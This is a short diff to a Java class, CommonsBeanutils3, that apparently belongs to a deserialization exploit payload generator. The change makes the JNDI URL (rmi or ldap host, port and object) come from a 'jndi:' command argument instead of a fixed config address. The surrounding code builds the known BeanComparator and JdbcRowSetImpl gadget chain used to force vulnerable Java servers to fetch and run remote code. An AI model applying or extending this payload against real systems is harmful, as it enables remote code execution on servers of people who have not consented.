@@ -22,7 +22,13 @@ public class CommonsBeanutils3 {
     }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
-        String jndiURL = "ldap://" + Config.ip + Config.ldapPort;
+        String jndiURL = null;
+        String command = String.valueOf(type);
+        if (command.toLowerCase().startsWith("jndi:")) {
+            jndiURL = command.substring(5);
+        } else {
+            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
+        }
 
         BeanComparator comparator = new BeanComparator("lowestSetBit");
         JdbcRowSetImpl rs         = new JdbcRowSetImpl();
